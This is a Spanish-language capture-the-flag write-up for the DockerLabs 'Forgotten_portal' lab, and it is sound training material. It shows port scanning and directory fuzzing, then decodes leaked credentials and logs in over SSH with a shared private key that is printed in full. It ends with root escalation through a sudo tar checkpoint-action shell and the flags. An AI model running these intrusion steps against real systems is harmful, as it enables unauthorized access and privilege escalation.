---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Forgotten\_portal DockerLabs (Intermediate)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip forgotten_portal.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh forgotten_portal.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-20 03:39 EST
Nmap scan report for ctf403.hl (172.17.0.2)
Host is up (0.000043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1d:4a:16:27:ad:b8:0b:aa:28:64:b0:10:3b:be:79:1c (ECDSA)
|_  256 0b:0f:11:d6:5a:e9:f5:25:c8:17:0d:71:c1:29:c9:53 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: CyberLand Labs - Innovaci\xC3\xB3n en Ciberseguridad
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.75 seconds
```

Si nos metemos en la pagina web que esta subida, veremos una pagina normal que aparentemente no hay ningun tipo de vulnerabilidad o nada raro, por lo que tendremos que `fuzzear` un poco para descubrir algun directorio oculto, etc...

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r 
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.html       (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/access_log           (Status: 200) [Size: 994]
/.htpasswd.php        (Status: 403) [Size: 275]
/blog.html            (Status: 200) [Size: 931]
/contact.html         (Status: 200) [Size: 826]
/index.html           (Status: 200) [Size: 3010]
/server-status        (Status: 403) [Size: 275]
/team.html            (Status: 200) [Size: 1327]
/uploads              (Status: 200) [Size: 741]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que hay un directorio bastante interesante llamado `uploads/` por lo que podemos intuir que se podra subir un archivo y con suerte hacernos una `reverse shell`.

## Escalate user alice

Pero si nos metemos en `/access_log` veremos lo siguiente:

```
# --- Access Log ---
# Fecha: 2023-11-22
# DescripciÃ³n: Registro de actividad inusual detectada en el sistema.
# Este archivo contiene eventos recientes capturados por el servidor web.

[2023-11-21 18:42:01] INFO: Usuario 'www-data' accediÃ³ a /var/www/html/.
[2023-11-21 18:43:45] WARNING: Intento de acceso no autorizado detectado en /var/www/html/admin/.
[2023-11-21 19:01:12] INFO: Script 'backup.sh' ejecutado por el sistema.
[2023-11-21 19:15:34] ERROR: No se pudo cargar el archivo config.php. Verifique las configuraciones.

# --- Logs del sistema ---
[2023-11-21 19:20:00] INFO: SincronizaciÃ³n completada con el servidor principal.
[2023-11-21 19:35:10] INFO: Archivo temporal creado: /tmp/tmp1234.
[2023-11-21 19:36:22] INFO: Clave codificada generada: YWxpY2U6czNjcjN0cEBzc3cwcmReNDg3
[2023-11-21 19:50:00] INFO: Actividad normal en el servidor. No se detectaron anomalÃ­as.
[2023-11-22 06:12:45] WARNING: Acceso sospechoso detectado desde IP 192.168.1.100.

# --- Fin del Log ---
```

Vemos un `hash` interesante que esta codificado en `Base64`:

```
YWxpY2U6czNjcjN0cEBzc3cwcmReNDg3
```

Decodificada se veria de la siguiente forma:

```
alice:s3cr3tp@ssw0rd^487
```

Por lo que vemos parece unas credenciales del usuario `alice`, por lo que si probamos a meter esa contraseña con dicho usuario por `ssh` funcionara.

```shell
ssh alice@<IP>
```

Metemos la contraseña `s3cr3tp@ssw0rd^487` y veremos que estamos dentro con dicho usuario, por lo que leeremos la flag:

> user.txt

```
CYBERLAND{us3r_l3v3l_fl4g}
```

## Escalate user bob

Si nos vamos a `/incidents` en la carpeta de `alice` habra un archivo llamado `report` que contiene lo siguiente:

```
=== INCIDENT REPORT ===
Archivo generado automaticamente por el sistema de auditoria interna de CyberLand Labs.

Fecha: 2023-11-22  
Auditor Responsable: Alice Carter  
Asunto: Configuracion Erronea de Claves SSH  

=== DESCRIPCION ===  
Durante una reciente auditoria de seguridad en nuestro servidor principal, descubrimos un grave error de configuracion en el sistema de autenticacion SSH. El problema parece originarse en un script automatizado utilizado para generar claves RSA para los usuarios del sistema.

En lugar de crear claves unicas para cada usuario, el script genero una unica clave `id_rsa` y la replico en todos los directorios de usuario en el servidor. Ademas, la clave esta protegida por una passphrase que, aunque tecnicamente existe, no ofrece ningun nivel real de seguridad.

=== HALLAZGO ADICIONAL ===  
Durante el analisis, encontramos que la passphrase de la clave privada del usuario `bob` se almaceno accidentalmente en un archivo temporal en el sistema. El archivo no ha sido eliminado, lo que significa que la passphrase esta ahora expuesta.

**Passphrase del Usuario `bob`:** `cyb3r_s3curity`

=== DETALLES DE LA CONFIGURACION ===  
Clave Privada: id_rsa  
Passphrase: cyb3r_s3curity  
Ubicacion: Copiada en todos los directorios `/home/<usuario>/.ssh/`

=== CONSECUENCIAS ===  
1. **Perdida de Privacidad**: Todos los usuarios comparten la misma clave, lo que significa que cualquiera puede autenticarse como cualquier otro usuario si obtiene acceso a la clave.  

=== POSIBLES SOLUCIONES ===  
- Implementar un sistema centralizado de gestion de claves.  
- Forzar a los usuarios a cambiar sus claves regularmente.  
- Actualizar las politicas internas para prohibir el uso de scripts inseguros en la configuracion de credenciales.  

=== NOTA FINAL ===  
Este incidente pone de manifiesto la importancia de revisar las configuraciones criticas en sistemas sensibles. Es crucial que todo el equipo de IT se mantenga alerta y que se implementen controles mas estrictos para evitar errores similares en el futuro.

--- FIN DEL INFORME ---
```

Nos esta comentando que la clave privada es la misma para todos los usuarios, solo que tiene como clave un `Passphrase` y que la muestra en texto plano llamado `cyb3r_s3curity`, por lo que podremos hacer lo siguiente con lo que nos comenta ese `report`.

Por lo que nos copiaremos el `id_rsa` del `.ssh/` de la carpeta de `alice` y nos la pasamos a nuestro `host`, quedaria algo asi:

> id\_rsa

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABD/Zl6Oa+
t/Nyrj5mS58b4UAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIH0U06i5Cvj9PvIg
dK8un8RIyk8IHB0d+OGgV5pg+VJyAAAAkGgMyLQZ/t4piG3I0P6JnXGOZ7nf5TWPY414hN
AaI6BO3ubesPARxs8RV8OQIF7L0DVJLPU8BDSuqmZgRLjlThdIzHRCCj9vf2lW9tzsZikd
6hfIWn1p+pDUvyyYPuKD9fjvr4NFlHVqHyz171SghCP+ePcbfAM1X5GwlTQwyBjf7Ibjrj
FKXxVgGHbqo+MLyw==
-----END OPENSSH PRIVATE KEY-----
```

Ponemos los permisos necesarios para que esto funcione.

```shell
chmod 600 id_rsa
```

Y nos conectamos con la clave privada por `ssh` con el usuario `bob`:

```shell
ssh -i id_rsa bob@172.17.0.2
```

Info:

```
Enter passphrase for key 'id_rsa':
```

Nos pedira un `passphrase` la cual hemos visto antes, por lo que le pasaremos la palabra `cyb3r_s3curity` y estaremos dentro como el usuario `bob`.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for bob on 10e2ba374420:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on 10e2ba374420:
    (ALL) NOPASSWD: /bin/tar
```

Por lo que vemos podremos ejecutar el binario `tar` como el usuario `root` por lo que haremos lo siguiente:

```shell
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Y con esto seremos `root`, por lo que leeremos la flag:

> root.txt

```
CYBERLAND{r00t_4cc3ss_gr4nt3d}
```
